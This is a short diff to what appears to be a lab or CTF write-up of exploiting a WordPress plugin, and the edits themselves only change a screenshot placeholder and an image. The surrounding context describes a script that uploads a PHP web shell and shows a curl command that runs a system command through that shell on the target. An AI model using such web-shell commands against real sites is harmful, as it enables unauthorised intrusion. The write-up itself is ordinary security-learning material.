@@ -114,8 +114,6 @@ After preparing the script, I executed it to trigger the vulnerability:
 python3 exploit.py
 ```
 
-📸 **Screenshot:** Exploit script execution
-
 The script successfully retrieved the nonce value and uploaded the PHP web shell.  
 The output confirmed a successful exploitation:
 
@@ -132,8 +130,7 @@ The script also provided a test command to verify command execution:
 ```bash
 curl -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=id"
 ```
-
----
+<img width="822" height="190" alt="cevap 3" src="https://github.com/user-attachments/assets/236351b7-a5f8-4ee5-81f5-4813bf5f904a" />
 
 ### 4.3 Web Shell Verification (RCE Confirmation)
 
